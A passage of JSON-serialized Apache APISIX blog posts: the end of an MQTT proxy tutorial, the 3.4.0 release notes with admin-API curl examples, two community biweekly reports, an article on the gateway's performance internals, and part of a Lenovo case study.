connected.\\n\\nIn our example, you can deploy a broker locally with the IoT devices and use a different broker for the cloud. APISIX will be able to route traffic between the two as shown below:\\n\\n![Decoupling](https://static.apiseven.com/uploads/2023/06/23/AEAsH053_mqtt-proxy-decoupled.png)\\n\\n_The broker in the local network will communicate with the valve and rest of the clients in the local network. APISIX will route the required messages to the broker deployed in your cloud which different clients in the cloud can subscribe to._\\n\\nDecoupling has its benefits. Now APISIX can handle the communication with the cloud, and your devices can communicate with APISIX instead of directly with the cloud.\\n\\n## TLS All the Way!\\n\\nAnother critical requirement for any communication system is security.\\n\\nWith APISIX as the MQTT proxy, security would mean securing the IoT device-to-APISIX and APISIX-to-cloud channels. The diagram below illustrates how APISIX achieves this through TLS authentication:\\n\\n![Securing communications](https://static.apiseven.com/uploads/2023/06/23/6Yb8oSu6_mqtt-proxy-tls.png)\\n\\n_APISIX can secure the client-to-APISIX and APISIX-to-broker communication._\\n\\nIn practice, we can update our configuration files to enable mutual TLS for the route (IoT-to-APISIX) and the upstream (APISIX-to-cloud):\\n\\n```yaml {title=\\"config.yaml\\"}\\napisix:\\n  enable_admin: false\\n  stream_proxy:\\n    only: false # allow HTTP as well\\n    tcp:\\n      - addr: 9000\\n        tls: true # enable TLS authentication\\ndeployment:\\n  role: data_plane # deploy APISIX in standalone mode as a data plane\\n  role_data_plane:\\n    config_provider: yaml\\nstream_plugins:\\n  - mqtt-proxy # enable the mqtt-proxy plugin\\n#END\\n```\\n\\n```yaml {title=\\"apisix.yaml\\"}\\nstream_routes:\\n  - id: 1\\n    upstream_id: 1\\n    sni: mqtt.navendu.me\\n    plugins:\\n      mqtt-proxy:\\n        protocol_name: \\"MQTT\\"\\n        protocol_level: 5 # use MQTT 5.0\\nupstreams:\\n  # configure multiple brokers\\n  - nodes:\\n      \\"host.docker.internal:1883\\": 1\\n      \\"host.docker.internal:1884\\": 1\\n    scheme: tls # enable TLS on upstream\\n    type: chash\\n    key: mqtt_client_id\\n    id: 1\\n#END\\n```\\n\\nFor a complete guide on configuring TLS,\xa0[refer to the documentation](https://apisix.apache.org/docs/apisix/next/stream-proxy/#accept-tls-over-tcp-connection).\\n\\n## Improving the MQTT Proxy\\n\\nOne of the key features of Apache APISIX is that it is\xa0[entirely open source](https://github.com/apache/apisix)\xa0and\xa0[extensible](https://apisix.apache.org/plugins/). You can add more features like MQTT transcoding to the\xa0[MQTT plugin](https://github.com/apache/apisix/blob/master/apisix/stream/plugins/mqtt-proxy.lua)\xa0or\xa0[create new plugins](https://apisix.apache.org/docs/apisix/plugin-develop/)\xa0for your specific MQTT proxy.\\n\\nWe are seeing more users using APISIX for its MQTT support, which is bound to increase further as MQTT becomes the default protocol for communication between IoT devices.\\n\\n_A special thank you to\xa0[Alfonso Gonz\xe1lez](https://github.com/alfonsogonz)\xa0for his input and review. Alfonso and his team use APISIX\'s MQTT proxy features in production._"},{"id":"Release Apache APISIX 3.4.0","metadata":{"permalink":"/blog/2023/06/30/release-apache-apisix-3.4.0","source":"@site/blog/2023/06/30/release-apache-apisix-3.4.0.md","title":"Release Apache APISIX 3.4.0","description":"The Apache APISIX 3.4.0 version is released on June 30, 2023. This version adds a new plugin for Grafana Loki, allows for mTLS connection on the route level, and made performance optimization to continuously enhance the user experience of APISIX.","date":"2023-06-30T00:00:00.000Z","formattedDate":"June 30, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.335,"truncated":true,"authors":[{"name":"Xin Rong","title":"Author","url":"https://github.com/AlinsRan","image_url":"https://avatars.githubusercontent.com/u/79972061?v=4","imageURL":"https://avatars.githubusercontent.com/u/79972061?v=4"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://avatars.githubusercontent.com/u/39619599?v=4","imageURL":"https://avatars.githubusercontent.com/u/39619599?v=4"}],"prevItem":{"title":"Connecting IoT Devices to the Cloud with APISIX MQTT Proxy","permalink":"/blog/2023/06/30/apisix-mqtt-proxy"},"nextItem":{"title":"Biweekly Report (June 06 - June 18)","permalink":"/blog/2023/06/21/weekly-report-en"}},"content":"We are pleased to present Apache APISIX 3.4.0 with exciting new features and performance improvements.\\n\\n\x3c!--truncate--\x3e\\n\\nThis release provides a new plugin `loki-logger` to forward logs to [Grafana Loki](https://grafana.com/oss/loki/), and allows for mTLS connection on the route level. In addition, the release also includes many other updates to continuously enhance the user experience of APISIX.\\n\\n## New Features\\n\\n### Support integration with Grafana Loki using the `loki-logger` plugin\\n\\nThe `loki-logger` plugin is used to forward logs to [Grafana Loki](https://grafana.com/oss/loki/) for analysis and storage.\\n\\nWhen the plugin is enabled, APISIX serializes the request context information to [log entries in JSON](https://grafana.com/docs/loki/latest/api/#push-log-entries-to-loki) and submits it to the batch queue. When the maximum batch size is reached, the data in the queue is pushed to Loki.\\n\\nFor example, you can enable the `loki-logger` plugin on a specific route:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"loki-logger\\": {\\n            \\"endpoint_addrs\\" : [\\"http://127.0.0.1:3100\\"]\\n        }\\n    },\\n    \\"upstream\\": {\\n       \\"nodes\\": {\\n           \\"127.0.0.1:1980\\": 1\\n       },\\n       \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"uri\\": \\"/hello\\"\\n}\'\\n```\\n\\nIf successful, APISIX logs should be forwarded to Loki running at `http://127.0.0.1:3100`.\\n\\nFor more information about the plugin, see `loki-logger` [plugin doc](https://github.com/apache/apisix/blob/release/3.4/docs/en/latest/plugins/loki-logger.md).\\n\\nPR for this feature could be found here [#9399](https://github.com/apache/apisix/pull/9399).\\n\\n### Support route-level mTLS\\n\\nSupport configuring mTLS on the route level. The Admin API SSL object now has a new configuration option, `client.skip_mtls_uri_regex`. Users can specify a list of URIs (RegEx supported) in this option, for which the verification of the client certificate should be skipped.\\n\\nFor example, you can configure a route-level mTLS such as the following:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"/*\\",\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"httpbin.org\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/ssls/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"cert\\": \\"\'\\"$(path/to/certs/mtls_server.crt)\\"\'\\",\\n    \\"key\\": \\"\'\\"$(path/to/certs/mtls_server.key)\\"\'\\",\\n    \\"snis\\": [\\n        \\"*.apisix.dev\\"\\n    ],\\n    \\"client\\": {\\n        \\"ca\\": \\"\'\\"$(path/to/certs/mtls_ca.crt)\\"\'\\",\\n        \\"depth\\": 10,\\n        \\"skip_mtls_uri_regex\\": [\\n            \\"/anything.*\\"\\n        ]\\n    }\\n}\'\\n```\\n\\nIf the URI of a request is in the `skip_mtls_uri_regex` list, then the client certificate will not be checked. Note that other URIs of the associated SNI will get HTTP 400 response instead of an alert error in the SSL handshake phase, if the client certificate is missing or invalid.\\n\\nFor a detailed example, see [Tutorial: mTLS bypass based on regular expression matching against URI](https://github.com/apache/apisix/blob/release/3.4/docs/en/latest/tutorials/client-to-apisix-mtls.md#mtls-bypass-based-on-regular-expression-matching-against-uri).\\n\\nPR for this feature could be found here [#9322](https://github.com/apache/apisix/pull/9322).\\n\\n## Other Updates\\n\\n* Support the use of one HTTP connection to watch the prefix for all etcd resources. This reduces the resource consumption and improved watch performance to be on par with gRPC connections ([PR #9456](https://github.com/apache/apisix/pull/9456))\\n* Support multiple RegEx patterns in the `proxy_rewrite` plugin ([PR #9194](https://github.com/apache/apisix/pull/9194))\\n* Allow users to configure `DEFAULT_BUCKETS` in the `prometheus` plugin ([PR #9673](https://github.com/apache/apisix/pull/9673))\\n\\n## Changelog\\n\\nFor a complete list of new features and bug fixes included in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md)."},{"id":"Biweekly Report (June 06 - June 18)","metadata":{"permalink":"/blog/2023/06/21/weekly-report-en","source":"@site/blog/2023/06/21/weekly-report-en.md","title":"Biweekly Report (June 06 - June 18)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-06-21T00:00:00.000Z","formattedDate":"June 21, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.095,"truncated":true,"authors":[],"prevItem":{"title":"Release Apache APISIX 3.4.0","permalink":"/blog/2023/06/30/release-apache-apisix-3.4.0"},"nextItem":{"title":"How Is Apache APISIX Fast?","permalink":"/blog/2023/06/12/how-is-apisix-fast"}},"content":"> From 6.06 to 6.18, 21 contributors submitted 32 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/07/21/KjBfvY2C_0606-0618%E8%B4%A1%E7%8C%AE%E8%80%85%E5%90%8D%E5%8D%95.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/06/20/zvIq9JId_%E6%96%B0%E6%99%8B%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5.png)\\n\\n## Highlight of Recent Features\\n\\n### Apache APISIX\\n\\n- [Ensure proper reloading of old state when recompiling protobuffer](https://github.com/apache/apisix/pull/9606) (Contributor: [kingluo](https://github.com/kingluo))\\n\\n## Recent Blog Recommendations\\n\\n- [APISIX Boosts Lenovo to Build Lightweight and Decentralized Gateway](https://apisix.apache.org/blog/2023/06/02/lenovo-uses-apisix/)\\n\\n  Lenovo established a decentralized gateway and centralized dev portal based on APISIX, resolving the bottlenecks of its previous system.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"How Is Apache APISIX Fast?","metadata":{"permalink":"/blog/2023/06/12/how-is-apisix-fast","source":"@site/blog/2023/06/12/how-is-apisix-fast.md","title":"How Is Apache APISIX Fast?","description":"Taking a look under Apache APISIX\'s hood to understand how it achieves ultimate performance.","date":"2023-06-12T00:00:00.000Z","formattedDate":"June 12, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.04,"truncated":true,"authors":[{"name":"API7.ai","title":"Author","url":"https://github.com/api7","image_url":"https://avatars.githubusercontent.com/u/61078451?s=200&v=4","imageURL":"https://avatars.githubusercontent.com/u/61078451?s=200&v=4"}],"prevItem":{"title":"Biweekly Report (June 06 - June 18)","permalink":"/blog/2023/06/21/weekly-report-en"},"nextItem":{"title":"Biweekly Report (May 23 - June 5)","permalink":"/blog/2023/06/08/weekly-report"}},"content":">In this article, we will look under the hood of APISIX and see what these are and how all of these work together to keep APISIX maintaining peak performance while handling significant traffic.\\n\x3c!--truncate--\x3e\\n\\n\\"High speed,\\" \\"minimum latency,\\" and \\"ultimate performance\\" are often used to characterize [Apache APISIX](https://api7.ai/apisix). Even when someone asks me about APISIX, my answer always includes \\"high-performance cloud native API gateway.\\"\\n\\nPerformance benchmarks (vs. [Kong](https://api7.ai/blog/apisix-kong-3-0-performance-comparison), [Envoy](https://apisix.apache.org/blog/2021/06/10/apache-apisix-and-envoy-performance-comparison/)) confirm these characteristics are indeed accurate ([test yourself](https://github.com/api7/apisix-benchmark)).\\n\\n![High speed, minimum latency, and ultimate performance](https://static.apiseven.com/uploads/2023/06/08/L0HjyWGM_apisix-vs-kong-light.png)\\n\\n_[Tests run](https://github.com/api7/apisix-benchmark) for 10 rounds with 5000 unique routes on Standard D8s v3 (8 vCPUs, 32 GiB memory)._\\n\\nBut how does APISIX achieve this?\\n\\nTo answer that question, we must look at three things: etcd, hash tables, and radix trees.\\n\\nIn this article, we will look under the hood of APISIX and see what these are and how all of these work together to keep APISIX maintaining peak performance while handling significant traffic.\\n\\n## etcd as the Configuration Center\\n\\nAPISIX uses [etcd](https://etcd.io/) to store and synchronize configurations.\\n\\netcd is designed to work as a key-value store for configurations of large-scale distributed systems. APISIX is intended to be distributed and highly scalable from the ground up, and using etcd over traditional databases facilitates that.\\n\\n![APISIX architecture](https://static.apiseven.com/uploads/2023/06/12/wjH9wJfU_architecture.png)\\n\\nAnother key indispensable feature for API gateways is to be highly available, avoiding downtime and data loss. You can efficiently achieve this by deploying multiple instances of etcd to ensure a fault-tolerant, cloud native architecture.\\n\\nAPISIX can read/write configurations from/to etcd with minimum latency. Changes to the configuration files are notified instantly, allowing APISIX to monitor only the etcd updates instead of polling a database frequently, which can add performance overhead.\\n\\nThis [chart](https://etcd.io/docs/v3.5/learning/why/#comparison-chart) summarizes how etcd compares with other databases.\\n\\n## Hash Tables for IP Addresses\\n\\nIP address-based allowlists/denylists are a common use case for API gateways.\\n\\nTo achieve high performance, APISIX stores the list of IP addresses in a hash table and uses it for matching (O(1)) than iterating through the list (O(N)).\\n\\nAs the number of IP addresses in the list increases, the performance impact of using hash tables for storage and matching becomes apparent.\\n\\nUnder the hood, APISIX uses the [lua-resty-ipmatcher](https://github.com/api7/lua-resty-ipmatcher) library to implement this functionality. The example below shows how the library is used:\\n\\n```lua\\nlocal ipmatcher = require(\\"resty.ipmatcher\\")\\nlocal ip = ipmatcher.new({\\n    \\"162.168.46.72\\",\\n    \\"17.172.224.47\\",\\n    \\"216.58.32.170\\",\\n})\\n\\nngx.say(ip:match(\\"17.172.224.47\\")) -- true\\nngx.say(ip:match(\\"176.24.76.126\\")) -- false\\n```\\n\\nThe library uses Lua tables which are hash tables. The IP addresses are hashed and stored as indices in a table, and to search for a given IP address, you just have to index the table and test whether it is nil or not.\\n\\n![Storing IP addresses in a hash table](https://static.apiseven.com/uploads/2023/06/12/5N5UFBWG_hash-table.png)\\n\\n_To search for an IP address, it first computes the hash (index) and checks its value. If it is non-empty, we have a match. This is done in constant time O(1)._\\n\\n## Radix Trees for Routing\\n\\nPlease forgive me for tricking you into a data structures lesson! But hear me out; this is where it gets interesting.\\n\\nA key area where APISIX optimizes performance is route matching.\\n\\nAPISIX matches a route with a request from its URI, HTTP methods, host, and other information (see [router](https://github.com/apache/apisix/blob/98e56716fdf76b97c90531cac24de811d841c296/conf/config-default.yaml#L77)). And this needs to be efficient.\\n\\nIf you have read the previous section, an obvious answer would be to use a hash algorithm. But route matching is tricky because multiple requests can match the same route.\\n\\nFor example, if we have a route `/api/*`, then both `/api/create` and `/api/destroy` must match the route. But this is not possible with a hash algorithm.\\n\\nRegular expressions can be an alternate solution. Routes can be configured in a regex, and it can match multiple requests without the need to hardcode each request.\\n\\nIf we take our previous example, we can use the regex `/api/[A-Za-z0-9]+` to match both `/api/create` and `/api/destroy`. More complex regexes could match more complex routes.\\n\\nBut regex is slow! And we know APISIX is fast. So instead, APISIX uses radix trees which are compressed prefix trees (trie) that work really well for fast lookups.\\n\\nLet\'s look at a simple example. Suppose we have the following words:\\n\\n- romane\\n- romanus\\n- romulus\\n- rubens\\n- ruber\\n- rubicon\\n- rubicundus\\n\\nA prefix tree would store it like this:\\n\\n![Prefix tree](https://static.apiseven.com/uploads/2023/06/12/wDoV1tl6_prefix-tree.png)\\n\\n_The highlighted traversal shows the word \\"rubens.\\"_\\n\\nA radix tree optimizes a prefix tree by merging child nodes if a node only has one child node. Our example trie would look like this as a radix tree:\\n\\n![Radix tree](https://static.apiseven.com/uploads/2023/06/12/ePG0v1sB_radix-tree.png)\\n\\n_The highlighted traversal still shows the word \\"rubens.\\" But the tree looks much smaller!_\\n\\nWhen you [create routes in APISIX](https://docs.api7.ai/apisix/getting-started/configure-routes), APISIX stores them in these trees.\\n\\nAPISIX can then work flawlessly because the time it takes to match a route only depends on the length of the URI in the request and is independent of the number of routes (O(K), K is the length of the key/URI).\\n\\nSo APISIX will be as quick as it is when matching 10 routes when you first start out and 5000 routes when you scale.\\n\\nThis crude example shows how APISIX can store and match routes using radix trees:\\n\\n![Crude example of route matching in APISIX](https://static.apiseven.com/uploads/2023/06/12/eiOwAjNu_apisix-route-matching.png)\\n\\n_The highlighted traversal shows the route `/user/*` where the `*` represents a prefix. So a URI like `/user/navendu` will match this route. The example code below should give more clarity to these ideas._\\n\\nAPISIX uses the [lua-resty-radixtree](https://github.com/api7/lua-resty-radixtree) library, which wraps around [rax](https://github.com/antirez/rax), a radix tree implementation in C. This improves the performance compared to implementing the library in pure Lua.\\n\\nThe example below shows how the library is used:\\n\\n```lua\\nlocal radix = require(\\"resty.radixtree\\")\\nlocal rx = radix.new({\\n    {\\n        paths = { \\"/api/*action\\" },\\n        metadata = { \\"metadata /api/action\\" }\\n    },\\n    {\\n        paths = { \\"/user/:name\\" },\\n        metadata = { \\"metadata /user/name\\" },\\n        methods = { \\"GET\\" },\\n    },\\n    {\\n        paths = { \\"/admin/:name\\" },\\n        metadata = { \\"metadata /admin/name\\" },\\n        methods = { \\"GET\\", \\"POST\\", \\"PUT\\" },\\n        filter_fun = function(vars, opts)\\n            return vars[\\"arg_access\\"] == \\"admin\\"\\n        end\\n    }\\n})\\n\\nlocal opts = {\\n    matched = {}\\n}\\n\\n-- matches the first route\\nngx.say(rx:match(\\"/api/create\\", opts)) -- metadata /api/action\\nngx.say(\\"action: \\", opts.matched.action) -- action: create\\n\\nngx.say(rx:match(\\"/api/destroy\\", opts)) -- metadata /api/action\\nngx.say(\\"action: \\", opts.matched.action) -- action: destroy\\n\\nlocal opts = {\\n    method = \\"GET\\",\\n    matched = {}\\n}\\n\\n-- matches the second route\\nngx.say(rx:match(\\"/user/bobur\\", opts)) -- metadata /user/name\\nngx.say(\\"name: \\", opts.matched.name) -- name: bobur\\n\\nlocal opts = {\\n    method = \\"POST\\",\\n    var = ngx.var,\\n    matched = {}\\n}\\n\\n-- matches the third route\\n-- the value for `arg_access` is obtained from `ngx.var`\\nngx.say(rx:match(\\"/admin/nicolas\\", opts)) -- metadata /admin/name\\nngx.say(\\"admin name: \\", opts.matched.name) -- admin name: nicolas\\n```\\n\\nThe ability to manage a large number of routes efficiently has made APISIX the API gateway of choice for [many large-scale projects](https://api7.ai/category/usercase).\\n\\n## Look under the Hood\\n\\nThere is only so much I can explain about the inner workings of APISIX in one article.\\n\\nBut the best part is that the libraries mentioned here and Apache APISIX are [entirely open source](https://github.com/apache/apisix/), meaning you can look under the hood and modify things yourself.\\n\\nAnd if you can improve APISIX to get that final bit of performance, you can [contribute the changes](https://apisix.apache.org/docs/general/contributor-guide/) back to the project and let everyone benefit from your work."},{"id":"Biweekly Report (May 23 - June 5)","metadata":{"permalink":"/blog/2023/06/08/weekly-report","source":"@site/blog/2023/06/08/weekly-report.md","title":"Biweekly Report (May 23 - June 5)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-06-08T00:00:00.000Z","formattedDate":"June 8, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.205,"truncated":true,"authors":[],"prevItem":{"title":"How Is Apache APISIX Fast?","permalink":"/blog/2023/06/12/how-is-apisix-fast"},"nextItem":{"title":"APISIX Boosts Lenovo to Build Lightweight and Decentralized Gateway","permalink":"/blog/2023/06/02/lenovo-uses-apisix"}},"content":"> From 5.23 to 6.05, 20 contributors submitted 37 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/07/21/W6fnIkOZ_0523-0605.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/06/08/MOxcew0f_%E6%96%B0%E6%99%8B%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5.png)\\n\\n## Highlights of Recent Features\\n\\n- [Use a single http long connection to watch all resources](https://github.com/apache/apisix/pull/9456) (Contributor: [kingluo](https://github.com/kingluo))\\n\\n- [skywalking-logger and error-log-logger support $hostname variable name](https://github.com/apache/apisix/pull/9401) (Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\n- [Add support for loki-logger plugin](https://github.com/apache/apisix/pull/9399) (Contributor: [bzp2010](https://github.com/bzp2010))\\n\\n- [APISIX 3.2.1 Release](https://github.com/apache/apisix/pull/9560) (Contributor: [leslie-tsang](https://github.com/leslie-tsang))\\n\\n## Recent Blog Recommendations\\n\\n- [APISIX Boosts Lenovo to Build Lightweight and Decentralized Gateway](https://apisix.apache.org/blog/2023/06/02/lenovo-uses-apisix/)\\n\\n  Lenovo established a decentralized gateway and centralized dev portal based on APISIX, resolving the bottlenecks of its previous system.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"APISIX Boosts Lenovo to Build Lightweight and Decentralized Gateway","metadata":{"permalink":"/blog/2023/06/02/lenovo-uses-apisix","source":"@site/blog/2023/06/02/lenovo-uses-apisix.md","title":"APISIX Boosts Lenovo to Build Lightweight and Decentralized Gateway","description":"Lenovo established a decentralized gateway and centralized dev portal based on APISIX, resolving the bottlenecks of its previous system.","date":"2023-06-02T00:00:00.000Z","formattedDate":"June 2, 2023","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":9.55,"truncated":true,"authors":[{"name":"Leon Yang","title":"Author","url":"https://github.com/leonyaa","image_url":"https://avatars.githubusercontent.com/u/2486554?v=4","imageURL":"https://avatars.githubusercontent.com/u/2486554?v=4"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://avatars.githubusercontent.com/u/114121331?v=4","imageURL":"https://avatars.githubusercontent.com/u/114121331?v=4"}],"prevItem":{"title":"Biweekly Report (May 23 - June 5)","permalink":"/blog/2023/06/08/weekly-report"},"nextItem":{"title":"Release Apache APISIX 3.2.1","permalink":"/blog/2023/06/01/release-apache-apisix-3.2.1"}},"content":"> Lenovo established a decentralized gateway and centralized dev portal based on APISIX, resolving the bottlenecks of its previous system.\\n\x3c!--truncate--\x3e\\n\\n## Overview\\n\\nI\'m Leon Yang, a Senior IT Architect at Lenovo, dedicated to promoting the reuse of software engineering components and building a sharing technology ecosystem. In the past two years, I have published more than 20 patents in enterprise software, big data, and artificial intelligence.\\n\\nLenovo Group Limited, which was founded on November 1, 1984, as Legend and is commonly referred to as Lenovo, is an American-Chinese multinational technology company specializing in designing, manufacturing, and marketing consumer electronics, personal computers, software, business solutions, and related services.\\n\\n## Background\\n\\nNowadays, businesses are becoming more and more complex. Technologies are changing with each passing day, which has greatly impacted software development. We have been looking for a more efficient way for project delivery at a lower cost, that is reusing original system resources by componentization.\\n\\n![Lenovo-system-architecture](https://static.apiseven.com/uploads/2023/06/05/qTyereco_Lenovo-system-architecture.jpeg)\\n\\nThe first step is to build an out-of-the-box reusable internal API ecosystem with a large number of components. Therefore, our team can reuse existing software assets by componentizing technical functions and standardizing the architecture. It is an effective way for enterprises, enabling developers no longer need to face a variety of technology selections.\\n\\nConsequently, our team started developing its internal applications based on component-based patterns, reducing engineering application development costs, and improving software delivery with quality and efficiency. Meantime, we established a high-quality enterprise API service ecosystem for fully reusing the capabilities of internal systems and external partners, thus constructing powerful business solutions.\\n\\n## Challenges of Centralized API Gateway Architecture in Complex Enterprise Environments\\n\\nThe API gateway plays a vital role in the API ecosystem. The following picture shows how we use the API gateway in different scenarios.\\n\\n![Challenges-of-Centralized-API-Gateway](https://static.apiseven.com/uploads/2023/06/05/gI5G0TAE_Challenges-of-Centralized-API-Gateway.jpeg)\\n\\nIn a large enterprise, there will be an intranet and a DMZ (demilitarized zone). In the intranet, if hundreds of application systems need to implement API calls through the API gateway, a centralized intranet gateway will be established to be responsible for API routing, authentication, WAF control, etc. If the API service is to provide external network services, according to the strict architecture design, a centralized gateway needs to be deployed in the DMZ. The API call goes through the DMZ and then will be exposed to the public network through the relevant firewall.\\n\\nThere are many challenges in this process.\\n\\n- Distributed API information and incorrect use of API bring **high operational costs**.\\n\\n- **Limited scalability and availability** because of a single point of failure. If the gateway fails, all requests will be blocked, resulting in downtime and disruption of services (centralized team resource).\\n\\n- Too many API scenarios and routes deployed in one gateway node can **easily become overwhelming and cause latency issues**.\\n\\n- **Excessive resource usage or failure** by an API can negatively impact the performance of all APIs.\\n\\n- Installing an etcd / ZK for each API gateway makes the **architecture too heavy**. (using admin console)\\n\\n- Heterogeneous system architecture has **multiple API authorizations** from API gateway and API service providers, which adds complexity to API usage.\\n\\n## Why Lenovo Opted for APISIX\\n\\nWe chose APISIX mainly because APISIX has merits in the below aspects.\\n\\n- Built with NGINX and LuaJIT, APISIX has **high performance, rich OpenResty library, and is easy for customization**. In the past, we adopted multiple commercial API gateway products that were positioned in the leading quadrant of Gartner. However, these products posed challenges in meeting the unique needs of enterprises, such as customizing authorization flows and dashboards.\\n\\n- **APISIX Provides lightweight deployment architecture**. We need a lightweight gateway that can function as a component embedded within an application. However, most commercial or open-source API gateway products are too heavy for our system.\\n\\n- **Dynamic hot reloading** allows for publishing APIs without the need to restart systems, reducing downtime and improving business system operation SLA.\\n\\n- **Flexible plugin customization** enables developers to create personalized processes that meet the unique needs of the enterprise.\\n\\n- With the strong support of an **active community ecosystem and a wide range of high-quality plugins like kafka-logger and authz-keycloak**, we benefit from enhanced functionality and extensive customization options.\\n\\n- **The enabled Web Application Firewall (WAF) provides essential security measures and traffic control features** to enhance the overall protection and performance of our system.\\n\\n- **Friendly open-source license: Apache License 2.0.** Lenovo only considers using two protocols, Apache License 2.0 and MIT in terms of security compliance.\\n\\n## Decentralized Gateway and Centralized Dev Portal based on APISIX\\n\\nOur team adopted several measures to integrate its architecture with APISIX.\\n\\n![API-Dev-Portal](https://static.apiseven.com/uploads/2023/06/05/hkkTZixS_API%20Dev%20Portal.jpeg)\\n\\n### Build Centralized API Dev Portal\\n\\nWe established its Centralized API Dev Portal to improve the efficiency and quality of API management and use of API.\\n\\n![Build-Centralized-API-Dev-Portal](https://static.apiseven.com/uploads/2023/06/05/3V2Xea7k_Build%20Centralized%20API%20Dev%20Portal.jpeg)\\n\\nThe Dev Portal has the following features.\\n\\n- Provide unified API service catalog management and API information publishing, including API specifications, use cases & samples, and access control policies\\n\\n- Provide developers with an easy-to-use API marketplace to search, test, and subscribe to APIs efficiently\\n\\n- Provide a convenient way for tracking gateway status and notifying the changes of API subscription and policies\\n\\n- Use API analytics to track API usage, measure the performance of API gateways and API services (exception, throughput, latency, etc.)\\n\\n### Build Centralized Registry Center\\n\\n![Build-Centralized-Registry-Center](https://static.apiseven.com/uploads/2023/06/05/CvfRTSda_Build%20Centralized%20Registry%20Center.jpeg)\\n\\nSet up a Centralized Registry Center (etcd) for gateway health-check and API subscription synchronization to deploy multiple registry centers.\\n\\nAPI Dev Portal publishes API subscriptions to the Registry Center when developers subscribe to API under a specified gateway.\\n\\nGateway sends a heartbeat to the Registry Center regularly, usually every 10 seconds, to inform the Registry Center that it is still alive. When the subscription under the gateway changes, the Registry Center will trigger the gateway to pull the updates of API subscriptions and deploy them locally. This process ensures that the gateway is always up-to-date with the latest API subscription information.\\n\\nThe API log & metrics reporter running as a daemon in the gateway can be configured to regularly post key metrics of the API to the Kafka topic. And the metrics then be consumed by the log receiver of API Analytics.\\n\\n### Provide Lightweight Gateway\\n\\nLenovo provided a lightweight gateway delegated in business applications or domains that provides secure access to applications and services without a centralized gateway. This approach allows more granular control over access and authentication, improves scalability and performance, and reduces the risk of a single point of failure.\\n\\n### Offload Authorization of API Provision Services\\n\\nBy offloading the authorization of API provision services and delegating the authorization of API consumers to the business applications or domains, Lenovo can better manage their API security and improve the developer experience.\\n\\n## Achievements after Using APISIX\\n\\nAfter implementing APISIX, a significant number of changes were made within Lenovo.\\n\\n### Improved Performance with Flexible Configuration\\n\\n**APISIX\'s remarkable scalability offers Lenovo the necessary flexibility for customization.** With APISIX,  Lenovo\'s decentralized gateway architecture provides high-performance and highly scalable enterprise-level API gateway solutions, effectively eliminating the bottleneck caused by centralization.\\n\\nPreviously, the system resources constrain the number of APIs that can be deployed in a single cluster to less than 1,000. The gateway performance is bottlenecked by some resource-intensive APIs, resulting in an average throughput of **less than 4,000 TPS**. Furthermore, any API failure will degrade the overall API routing performance and affect all clients.\\n\\nHowever, by leveraging APISIX, Lenovo\'s decentralized gateway architecture enables the efficient deployment of gateway nodes and APIs based on specific business scenarios. Each gateway node can be configured and optimized independently according to its system resources and workload. Consequently, there is no longer a limit on the total number of APIs that can be deployed across the network. Moreover, with proper tuning, **the gateway performance can be significantly improved to exceed 20,000 TPS**.\\n\\n### Inreased Security and Scalability\\n\\n**Deploying a lightweight gateway as a component of an application or business domain improved the application security, as well as greatly enhanced the 